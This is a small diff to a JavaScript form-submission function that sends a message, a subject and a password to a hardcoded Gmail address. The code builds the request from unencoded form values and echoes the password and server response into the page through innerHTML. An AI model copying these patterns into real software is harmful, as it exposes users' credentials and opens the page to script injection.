@@ -26,7 +26,7 @@ function submitform(e, sender) {
     var message = getIdValue('message');
     var password = getIdValue('password');
     var to = "okanlawonemmanuel41@gmail.com"
-    var vars = "body=" + message + "&subject=" + subject + "&password =" + password + "&to =" + to;
+    var vars = "body=" + message + "&subject=" + subject + "&password=" + password + "&to =" + to;
     var msg = document.getElementById("alert");
 
 
@@ -45,7 +45,7 @@ function submitform(e, sender) {
         if (hr.readystate == 4 || hr.status == 200) {
             var response = hr.responseText;
             msg.style.display = "block";
-            msg.innerHTML = response + " "+password;
+            msg.innerHTML = response + "-"+password;
         }
 
     }
